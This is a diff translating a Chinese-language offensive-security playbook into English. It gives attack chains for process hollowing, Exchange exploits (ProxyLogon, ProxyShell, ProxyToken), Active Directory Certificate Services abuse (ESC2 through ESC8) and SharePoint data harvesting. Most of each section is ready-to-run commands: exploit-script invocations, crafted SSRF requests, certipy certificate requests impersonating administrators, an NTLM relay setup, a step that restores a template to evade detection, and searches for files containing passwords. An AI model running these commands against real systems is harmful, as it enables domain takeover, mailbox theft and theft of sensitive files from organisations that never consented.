+Subclass: **Process Injection** · tags: `process-hollowing` `persistence` `injection`
 
-**前置条件：** 代码执行权限
+**Preconditions:** Code execution privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 进程镂空原理**  _[windows]_
-_进程镂空原理_
+**1. Process hollowing principle**  _[windows]_
+_Process hollowing principle_
 ```
-1. 创建合法进程(挂起状态)
-2. 替换进程内存
-3. 恢复执行
+1. Create a legitimate process (suspended state)
+2. Replace process memory
+3. Resume execution
 ```
 
-**2. C#实现**  _[windows]_
-_C#进程镂空_
+**2. C# implementation**  _[windows]_
+_C# process hollowing_
 ```
 using System.Runtime.InteropServices;
-// 创建挂起进程
+// Create a suspended process
 CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
-// 替换内存
+// Replace memory
 NtUnmapViewOfSection(...);
 VirtualAllocEx(...);
 WriteProcessMemory(...);
 ResumeThread(...);
 ```
 
-**3. 检测方法**  _[windows]_
-_检测进程镂空_
+**3. Detection method**  _[windows]_
+_Detect process hollowing_
 ```
-检查进程内存:
-- 进程路径与内存内容不匹配
-- 异常的内存区域
-- 使用EDR检测
+Check process memory:
+- Process path does not match memory content
+- Abnormal memory regions
+- Use EDR for detection
 ```
 
 ---
 
-## Exchange攻击
+## Exchange Attacks
 
-### ProxyLogon攻击  `proxylogon`
+### ProxyLogon Attack  `proxylogon`
 CVE-2021-26855 Exchange SSRF
-子类：**ProxyLogon** · tags: `exchange` `proxylogon` `cve-2021-26855`
+Subclass: **ProxyLogon** · tags: `exchange` `proxylogon` `cve-2021-26855`
 
-**前置条件：** Exchange可访问
+**Preconditions:** Exchange is reachable
 
-**攻击链：**
+**Attack chain:**
 
-**1. 探测漏洞**  _[linux]_
-_检查Exchange版本_
+**1. Probe the vulnerability**  _[linux]_
+_Check Exchange version_
 ```
 curl -k https://exchange.com/owa/auth/x.js
-检查Exchange版本
+Check Exchange version
 ```
 
-**2. 利用脚本**  _[linux]_
-_利用ProxyLogon_
+**2. Exploit script**  _[linux]_
+_Exploit ProxyLogon_
 ```
 python proxylogon.py -u https://exchange.com -e admin@domain.com
-获取管理员邮箱访问权限
+Obtain administrator mailbox access
 ```
 
-**3. 手动利用**
-_手动构造请求_
+**3. Manual exploitation**
+_Manually craft the request_
 ```
 POST /owa/auth/x.js HTTP/1.1
 Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
 X-ClientId=xxx
 
-构造SSRF请求
+Craft the SSRF request
 ```
 
 ---
 
-### ProxyShell攻击  `proxyshell`
+### ProxyShell Attack  `proxyshell`
 CVE-2021-34473 Exchange RCE
-子类：**ProxyShell** · tags: `exchange` `proxyshell` `cve-2021-34473`
+Subclass: **ProxyShell** · tags: `exchange` `proxyshell` `cve-2021-34473`
 
-**前置条件：** Exchange可访问
+**Preconditions:** Exchange is reachable
 
-**攻击链：**
+**Attack chain:**
 
-**1. 探测漏洞**  _[linux]_
-_探测漏洞_
+**1. Probe the vulnerability**  _[linux]_
+_Probe the vulnerability_
 ```
 curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
-检查是否存在漏洞
+Check whether the vulnerability exists
 ```
 
-**2. 利用脚本**  _[linux]_
-_利用ProxyShell_
+**2. Exploit script**  _[linux]_
+_Exploit ProxyShell_
 ```
 python proxyshell.py -u https://exchange.com -e admin@domain.com
-获取邮箱访问并执行命令
+Obtain mailbox access and execute commands
 ```
 
-**3. 获取邮件**
-_访问邮箱_
+**3. Retrieve mail**
+_Access the mailbox_
 ```
 GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1
-访问邮箱内容
+Access mailbox content
 ```
 
 ---
 
-### Exchange枚举  `exchange-enum`
-枚举Exchange服务和配置
-子类：**枚举** · tags: `exchange` `enum` `recon`
+### Exchange Enumeration  `exchange-enum`
+Enumerate Exchange services and configuration
+Subclass: **Enumeration** · tags: `exchange` `enum` `recon`
 
-**前置条件：** Exchange可访问
+**Preconditions:** Exchange is reachable
 
-**攻击链：**
+**Attack chain:**
 
-**1. 版本探测**  _[linux]_
-_探测Exchange版本_
+**1. Version probing**  _[linux]_
+_Probe Exchange version_
 ```
 curl -k https://exchange.com/owa/auth/logon.aspx
-检查页面源码获取版本信息
+Check the page source to obtain version information
 ```
 
 **2. Autodiscover**  _[linux]_
-_Autodiscover枚举_
+_Autodiscover enumeration_
 ```
 curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml
-获取Exchange配置信息
+Obtain Exchange configuration information
 ```
 
-**3. 邮箱枚举**  _[linux]_
-_枚举邮箱用户_
+**3. Mailbox enumeration**  _[linux]_
+_Enumerate mailbox users_
 ```
 python oab.py https://exchange.com
-下载离线通讯录枚举用户
+Download the offline address book to enumerate users
 ```
 
-**4. NTLM泄露**  _[linux]_
-_NTLM信息泄露_
+**4. NTLM disclosure**  _[linux]_
+_NTLM information disclosure_
 ```
 curl -k https://exchange.com/autodiscover/autodiscover.xml
-从WWW-Authenticate头获取域信息
+Obtain domain information from the WWW-Authenticate header
 ```
 
 ---
 
-### ProxyToken攻击  `exchange-proxytoken`
-利用Exchange ProxyToken绕过认证
-子类：**ProxyToken** · tags: `exchange` `proxytoken` `bypass`
+### ProxyToken Attack  `exchange-proxytoken`
+Bypass authentication using Exchange ProxyToken
+Subclass: **ProxyToken** · tags: `exchange` `proxytoken` `bypass`
 
-**前置条件：** Exchange服务器；存在漏洞
+**Preconditions:** Exchange server; vulnerability present
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检测漏洞**  _[linux]_
-_检测漏洞_
+**1. Detect the vulnerability**  _[linux]_
+_Detect the vulnerability_
 ```
-使用ProxyToken工具:
+Use the ProxyToken tool:
 python proxytoken.py -u https://exchange.com -e user@domain.com
-检测是否存在漏洞
+Detect whether the vulnerability exists
 ```
 
-**2. 利用漏洞**  _[linux]_
-_获取邮箱访问_
+**2. Exploit the vulnerability**  _[linux]_
+_Obtain mailbox access_
 ```
 python proxytoken.py -u https://exchange.com -e user@domain.com -a
-获取用户邮箱访问权限
+Obtain user mailbox access
 ```
 
-**3. 访问邮箱**
-_访问EWS接口_
+**3. Access the mailbox**
+_Access the EWS interface_
 ```
 curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
-绕过认证访问EWS
+Bypass authentication to access EWS
 ```
 
 ---
 
-### Exchange邮箱访问  `exchange-mailbox-access`
-通过各种方式访问Exchange邮箱
-子类：**邮箱访问** · tags: `exchange` `mailbox` `access`
+### Exchange Mailbox Access  `exchange-mailbox-access`
+Access Exchange mailboxes via various methods
+Subclass: **Mailbox Access** · tags: `exchange` `mailbox` `access`
 
-**前置条件：** Exchange凭证或漏洞
+**Preconditions:** Exchange credentials or vulnerability
 
-**攻击链：**
+**Attack chain:**
 
-**1. OWA访问**
-_OWA Web访问_
+**1. OWA access**
+_OWA web access_
 ```
 https://exchange.com/owa
-使用凭证登录OWA
-查看邮件、日历等
+Log in to OWA with credentials
+View mail, calendar, etc.
 ```
 
-**2. EWS访问**  _[linux]_
-_EWS API访问_
+**2. EWS access**  _[linux]_
+_EWS API access_
 ```
-使用Impacket:
+Using Impacket:
 python exchanger.py domain/user:password@exchange.com
-或使用EWSTools
+or use EWSTools
 ```
 
 **3. Outlook MAPI**  _[windows]_
-_Outlook客户端_
+_Outlook client_
 ```
-配置Outlook连接Exchange
-使用MAPI协议访问邮箱
-支持邮件、日历、联系人
+Configure Outlook to connect to Exchange
+Access the mailbox using the MAPI protocol
+Supports mail, calendar, contacts
 ```
 
-**4. 导出邮箱**  _[windows]_
-_导出邮箱_
+**4. Export mailbox**  _[windows]_
+_Export mailbox_
 ```
 PowerShell:
 New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
-导出邮箱为PST文件
+Export the mailbox as a PST file
 ```
 
 ---
 
-## ADCS攻击
+## ADCS Attacks
 
-### ADCS ESC2攻击  `adcs-esc2`
-利用ESC2模板配置错误
-子类：**ESC2** · tags: `adcs` `esc2` `certificate`
+### ADCS ESC2 Attack  `adcs-esc2`
+Exploit ESC2 template misconfiguration
+Subclass: **ESC2** · tags: `adcs` `esc2` `certificate`
 
-**前置条件：** 域环境；ADCS服务；存在ESC2模板
+**Preconditions:** Domain environment; ADCS service; ESC2 template present
 
-**攻击链：**
+**Attack chain:**
 
-**1. 探测ESC2模板**  _[linux]_
-_探测ESC2模板_
+**1. Probe for ESC2 templates**  _[linux]_
+_Probe for ESC2 templates_
 ```
 certipy find -u user@domain.com -p password -dc-ip DC_IP
-查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板
+Look for Any Purpose or CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT templates
 ```
 
-**2. 请求证书**  _[linux]_
-_请求管理员证书_
+**2. Request a certificate**  _[linux]_
+_Request an administrator certificate_
 ```
 certipy req -u user@domain.com -p password -ca CA_NAME -target DC_IP -template VULNERABLE_TEMPLATE -upn administrator@domain.com
 ```
 
-**3. 使用证书认证**  _[linux]_
-_使用证书认证_
+**3. Authenticate with the certificate**  _[linux]_
+_Authenticate with the certificate_
 ```
 certipy auth -pfx administrator.pfx -dc-ip DC_IP
-获取管理员TGT
+Obtain the administrator TGT
 ```
 
 ---
 
-### ADCS ESC3攻击  `adcs-esc3`
-利用ESC3注册代理配置错误
-子类：**ESC3** · tags: `adcs` `esc3` `certificate`
+### ADCS ESC3 Attack  `adcs-esc3`
+Exploit ESC3 enrollment agent misconfiguration
+Subclass: **ESC3** · tags: `adcs` `esc3` `certificate`
 
-**前置条件：** 域环境；ADCS服务；存在ESC3配置
+**Preconditions:** Domain environment; ADCS service; ESC3 configuration present
 
-**攻击链：**
+**Attack chain:**
 
-**1. 探测ESC3**  _[linux]_
-_探测ESC3配置_
+**1. Probe for ESC3**  _[linux]_
+_Probe for ESC3 configuration_
 ```
 certipy find -u user@domain.com -p password -dc-ip DC_IP
-查找具有Enrollment Agent权限的模板
+Look for templates with Enrollment Agent privileges
 ```
 
-**2. 获取注册代理证书**  _[linux]_
-_获取注册代理证书_
+**2. Obtain an enrollment agent certificate**  _[linux]_
+_Obtain an enrollment agent certificate_
 ```
 certipy req -u user@domain.com -p password -ca CA_NAME -template EnrollmentAgent
-获取注册代理证书
+Obtain an enrollment agent certificate
 ```
 
-**3. 代表其他用户请求证书**  _[linux]_
-_代表管理员请求证书_
+**3. Request a certificate on behalf of another user**  _[linux]_
+_Request a certificate on behalf of an administrator_
 ```
 certipy req -u user@domain.com -p password -ca CA_NAME -template User -on-behalf-of DOMAIN\\Administrator -pfx agent.pfx
 ```
 
 ---
 
-### ADCS ESC4攻击  `adcs-esc4`
-利用ESC4模板权限配置错误
-子类：**ESC4** · tags: `adcs` `esc4` `certificate`
+### ADCS ESC4 Attack  `adcs-esc4`
+Exploit ESC4 template permission misconfiguration
+Subclass: **ESC4** · tags: `adcs` `esc4` `certificate`
 
-**前置条件：** 域环境；ADCS服务；对模板有写权限
+**Preconditions:** Domain environment; ADCS service; write permission on a template
 
-**攻击链：**
+**Attack chain:**
 
-**1. 探测ESC4**  _[linux]_
-_探测模板权限_
+**1. Probe for ESC4**  _[linux]_
+_Probe template permissions_
 ```
 certipy find -u user@domain.com -p password -dc-ip DC_IP
-查找用户有写权限的模板
+Look for templates the user has write permission on
 ```
 
-**2. 修改模板配置**  _[linux]_
-_修改模板配置_
+**2. Modify template configuration**  _[linux]_
+_Modify template configuration_
 ```
 certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -save-old
-修改模板为ESC1配置
+Modify the template to an ESC1 configuration
 ```
 
-**3. 请求证书**  _[linux]_
-_请求管理员证书_
+**3. Request a certificate**  _[linux]_
+_Request an administrator certificate_
 ```
 certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMPLATE -upn administrator@domain.com
 ```
 
-**4. 恢复模板配置**  _[linux]_
-_恢复模板配置_
+**4. Restore the template configuration**  _[linux]_
+_Restore the template configuration_
 ```
 certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
-恢复原配置避免检测
+Restore the original configuration to avoid detection
 ```
 
 ---
 
-### ADCS ESC6攻击  `adcs-esc6`
-利用ESC6编辑标志配置错误
-子类：**ESC6** · tags: `adcs` `esc6` `certificate`
+### ADCS ESC6 Attack  `adcs-esc6`
+Exploit ESC6 editf flag misconfiguration
+Subclass: **ESC6** · tags: `adcs` `esc6` `certificate`
 
-**前置条件：** 域环境；ADCS服务；CA启用EDITF_ATTRIBUTESUBJECTALTNAME2
+**Preconditions:** Domain environment; ADCS service; CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
 
-**攻击链：**
+**Attack chain:**
 
-**1. 探测ESC6**  _[linux]_
-_探测CA配置_
+**1. Probe for ESC6**  _[linux]_
+_Probe CA configuration_
 ```
 certipy find -u user@domain.com -p password -dc-ip DC_IP
-查找EDITF_ATTRIBUTESUBJECTALTNAME2标志
+Look for the EDITF_ATTRIBUTESUBJECTALTNAME2 flag
 ```
 
-**2. 请求证书**  _[linux]_
-_请求管理员证书_
+**2. Request a certificate**  _[linux]_
+_Request an administrator certificate_
 ```
 certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
-使用-alt参数指定SAN
+Use the -alt parameter to specify the SAN
 ```
 
-**3. 使用证书认证**  _[linux]_
-_认证获取TGT_
+**3. Authenticate with the certificate**  _[linux]_
+_Authenticate to obtain a TGT_
 ```
 certipy auth -pfx administrator.pfx -dc-ip DC_IP
 ```
 
 ---
 
-### ADCS ESC8攻击  `adcs-esc8`
-利用ESC8 HTTP端点进行NTLM中继
-子类：**ESC8** · tags: `adcs` `esc8` `ntlm-relay`
+### ADCS ESC8 Attack  `adcs-esc8`
+Perform NTLM relay via the ESC8 HTTP endpoint
+Subclass: **ESC8** · tags: `adcs` `esc8` `ntlm-relay`
 
-**前置条件：** 域环境；ADCS HTTP端点；可触发NTLM认证
+**Preconditions:** Domain environment; ADCS HTTP endpoint; NTLM authentication can be triggered
 
-**攻击链：**
+**Attack chain:**
 
-**1. 探测ESC8**  _[linux]_
-_探测HTTP端点_
+**1. Probe for ESC8**  _[linux]_
+_Probe HTTP endpoints_
 ```
 certipy find -u user@domain.com -p password -dc-ip DC_IP
-查找HTTP证书端点
+Look for HTTP certificate endpoints
 ```
 
-**2. 设置NTLM中继**  _[linux]_
-_设置NTLM中继_
+**2. Set up NTLM relay**  _[linux]_
+_Set up NTLM relay_
 ```
 impacket-ntlmrelayx -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
-监听NTLM认证并中继到ADCS
+Listen for NTLM authentication and relay it to ADCS
 ```
 
-**3. 触发认证**
-_触发目标NTLM认证_
+**3. Trigger authentication**
+_Trigger target NTLM authentication_
 ```
-使用多种方式触发:
-- 发送邮件链接
-- 打印机漏洞
+Trigger using various methods:
+- Send an email link
+- Printer vulnerability
 - WebDAV
-- 其他NTLM触发方式
+- Other NTLM trigger methods
 ```
 
 ---
 
-## SharePoint攻击
+## SharePoint Attacks
 
-### SharePoint枚举  `sharepoint-enum`
-枚举SharePoint站点和文件
-子类：**枚举** · tags: `sharepoint` `enum` `recon`
+### SharePoint Enumeration  `sharepoint-enum`
+Enumerate SharePoint sites and files
+Subclass: **Enumeration** · tags: `sharepoint` `enum` `recon`
 
-**前置条件：** SharePoint可访问
+**Preconditions:** SharePoint is reachable
 
-**攻击链：**
+**Attack chain:**
 
-**1. 站点枚举**  _[linux]_
-_枚举站点_
+**1. Site enumeration**  _[linux]_
+_Enumerate sites_
 ```
 curl -k https://sharepoint.com/_api/web/webs
-获取所有子站点
+Obtain all subsites
 ```
 
-**2. 用户枚举**  _[linux]_
-_枚举用户_
+**2. User enumeration**  _[linux]_
+_Enumerate users_
 ```
 curl -k https://sharepoint.com/_api/web/siteusers
-获取站点用户列表
+Obtain the list of site users
 ```
 
-**3. 文件枚举**  _[linux]_
-_枚举文档库_
+**3. File enumeration**  _[linux]_
+_Enumerate document libraries_
 ```
 curl -k https://sharepoint.com/_api/web/lists
-获取文档库列表
+Obtain the list of document libraries
 ```
 
-**4. 搜索文件**  _[linux]_
-_搜索敏感内容_
+**4. Search files**  _[linux]_
+_Search for sensitive content_
 ```
 curl -k "https://sharepoint.com/_api/search/query?querytext='password'"
-搜索敏感文件
+Search for sensitive files
 ```
 
 ---
 
-### SharePoint文件访问  `sharepoint-file-access`
-访问SharePoint文档库中的文件
-子类：**文件访问** · tags: `sharepoint` `file` `access`
+### SharePoint File Access  `sharepoint-file-access`
+Access files in SharePoint document libraries
+Subclass: **File Access** · tags: `sharepoint` `file` `access`
 
-**前置条件：** SharePoint凭证或漏洞
+**Preconditions:** SharePoint credentials or vulnerability
 
-**攻击链：**
+**Attack chain:**
 
-**1. Web界面访问**
-_Web界面访问_
+**1. Web interface access**
+_Web interface access_
 ```
 https://sharepoint.com/sites/site_name/Shared Documents
-通过浏览器访问文档库
-下载敏感文件
+Access the document library through the browser
+Download sensitive files
 ```
 
-**2. REST API访问**  _[linux]_
-_REST API访问_
+**2. REST API access**  _[linux]_
+_REST API access_
 ```
 curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
-获取文档列表
-下载文件内容
+Obtain the document list
+Download file content
 ```
 
-**3. CSOM访问**  _[windows]_
-_CSOM访问_
+**3. CSOM access**  _[windows]_
+_CSOM access_
 ```
-使用SharePoint客户端对象模型:
+Use the SharePoint Client Object Model:
 ClientContext context = new ClientContext("https://sharepoint.com");
 context.Credentials = new SharePointOnlineCredentials(user, password);
 List list = context.Web.Lists.GetByTitle("Documents");
 ```
 
-**4. OneDrive同步**
-_OneDrive同步_
+**4. OneDrive sync**
+_OneDrive sync_
 ```
-使用OneDrive客户端同步SharePoint文档库
-本地访问所有文件
-离线查看敏感数据
+Use the OneDrive client to sync the SharePoint document library
+Access all files locally
+View sensitive data offline
 ```
 
 ---
